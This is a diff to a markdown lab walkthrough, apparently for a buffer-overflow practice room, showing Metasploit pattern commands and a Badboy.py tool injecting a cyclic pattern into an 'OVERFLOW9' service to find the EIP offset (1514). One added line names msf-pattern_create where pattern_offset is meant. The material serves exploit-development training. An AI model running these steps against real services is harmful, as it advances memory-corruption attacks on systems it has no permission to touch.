@@ -19,10 +19,16 @@ I then decided to generate a cyclic pattern of 1600 bytes (100 bytes more), just
 msf-pattern_create -l 1600 | python3 Badboy.py --mode inject -c raw-tcp 10.10.112.205 1337 "OVERFLOW9" --cpattern 1
 ```
 ![Inject Cyclic PAttern](img/inject-a-cyclic-pattern-from-stdin.png)
+
+After having injected the cyclic pattern, we can see that the EIP value is being affected, copy the value in EIP
+and supply it to **msf-pattern_create**
+
+![Get Cyclic PAttern](img/get-cyclic-char-in-eip.png)
 ```
 msf-pattern_offset -l 1600 -q "35794234"
 ```
 ![Get Offset](img/get-offset-from-cyclic-chars.png)
+Now that we have found the correct offset, we can supply it to Badboy, to check if EIP will holde the value "CCCC" or "43434343"
 ```
 python3 Badboy.py --mode inject -c raw-tcp 10.10.112.205 1337 "OVERFLOW9" -off 1514
 ```
